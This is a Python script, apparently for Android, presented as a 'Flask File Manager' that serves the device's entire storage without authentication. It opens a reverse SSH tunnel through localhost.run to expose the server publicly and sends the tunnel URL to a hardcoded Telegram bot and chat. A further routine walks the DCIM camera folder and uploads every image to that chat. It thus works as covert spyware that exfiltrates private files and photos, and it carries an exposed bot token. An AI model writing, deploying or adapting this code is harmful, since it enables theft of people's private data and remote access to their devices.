import os
import telebot
import mimetypes
import subprocess
from flask import Flask, request, render_template_string, send_file, abort

BOT_TOKEN = "7686385723:AAFE801ZCkZDKOyl0XDS1pvlDRHZ7kIHyms"
CHAT_ID = "1027596128"
BASE_DIR = os.path.abspath('.')

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

def format_size(bytes):
    sizes = ['B', 'KB', 'MB', 'GB', 'TB']
    factor = 0
    while bytes >= 1024 and factor < len(sizes) - 1:
        bytes /= 1024
        factor += 1
    return f"{bytes:.2f} {sizes[factor]}"

@app.route('/')
def file_manager():
    
    directory = os.path.abspath(request.args.get('dir', '/storage/emulated/0/'))
    try:
        items = os.listdir(directory)
    except FileNotFoundError:
        abort(404, description="Directory not found")

    template = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Flask File Manager</title>
        <style>
            body { font-family: Arial, sans-serif; }
            table { width: 100%; border-collapse: collapse; }
            th, td { padding: 10px; border: 1px solid #ddd; }
            th { background-color: #f4f4f4; }
            a { text-decoration: none; color: #007BFF; }
            a:hover { text-decoration: underline; }
        </style>
    </head>
    <body>
        <h1>Flask File Manager</h1>
        <p>Current Directory: <strong>{{ current_dir }}</strong></p>
        <table>
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Type</th>
                    <th>Size</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                {% if current_dir != base_dir %}
                <tr>
                    <td colspan="4"><a href="/?dir={{ parent_dir }}">.. (Parent Directory)</a></td>
                </tr>
                {% endif %}
                {% for item in items %}
                <tr>
                    <td>
                        {% if item.is_dir %}
                            <a href="/?dir={{ item.path }}">{{ item.name }}</a>
                        {% else %}
                            {{ item.name }}
                        {% endif %}
                    </td>
                    <td>{{ 'Directory' if item.is_dir else 'File' }}</td>
                    <td>{{ '-' if item.is_dir else item.size }}</td>
                    <td>
                        {% if not item.is_dir %}
                            <a href="/view?file={{ item.path }}">View</a> |
                            <a href="/download?file={{ item.path }}">Download</a>
                        {% endif %}
                    </td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </body>
    </html>
    """
    items_data = []
    for item in items:
        item_path = os.path.join(directory, item)
        items_data.append({
            'name': item,
            'path': item_path,
            'is_dir': os.path.isdir(item_path),
            'size': format_size(os.path.getsize(item_path)) if os.path.isfile(item_path) else '-'
        })

    parent_dir = os.path.dirname(directory)
    return render_template_string(template, current_dir=directory, base_dir=BASE_DIR, parent_dir=parent_dir, items=items_data)

@app.route('/view')
def view_file():
    file_path = request.args.get('file')
    if not file_path or not os.path.isfile(file_path):
        abort(404, description="File not found")

    file_path = os.path.abspath(file_path)
    mime_type = "text/plain"
    try:
        with open(file_path, 'r') as file:
            content = file.read()
    except UnicodeDecodeError:
        abort(415, description="Unable to display binary file content")

    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Viewing: {os.path.basename(file_path)}</title>
    </head>
    <body>
        <h1>Viewing: {os.path.basename(file_path)}</h1>
        <pre>{content}</pre>
        <br>
        <a href="/">Back to File Manager</a>
    </body>
    </html>
    """

@app.route('/download')
def download_file():
    file_path = request.args.get('file')
    if not file_path or not os.path.isfile(file_path):
        abort(404, description="File not found")

    file_path = os.path.abspath(file_path)
    return send_file(file_path, as_attachment=True)

def fetch_serveo_url():
    try:
        process = subprocess.Popen(
            ['ssh', '-R', '80:localhost:5000', 'ssh.localhost.run'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        for line in process.stdout:
            if "tunneled with tls termination" in line:
                url = line.split()[0]
                return url
    except Exception as e:
        return f"Error: {str(e)}"

def send_images(directory):
    try:
        for root, _, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                mime_type, _ = mimetypes.guess_type(file_path)
                if mime_type and mime_type.startswith("image/"):
                    with open(file_path, 'rb') as img:
                        bot.send_photo(CHAT_ID, img)
    except Exception as e:
        bot.send_message(CHAT_ID, f"Error while sending images: {e}")

if __name__ == "__main__":
    dcim_path = "/storage/emulated/0/DCIM"
    bot.send_message(CHAT_ID, fetch_serveo_url())
    app.run(debug=False, host='0.0.0.0', port=5000)
    if os.path.exists(dcim_path):
        send_images(dcim_path)
    else:
        bot.send_message(CHAT_ID, "No images found in DCIM directory.")
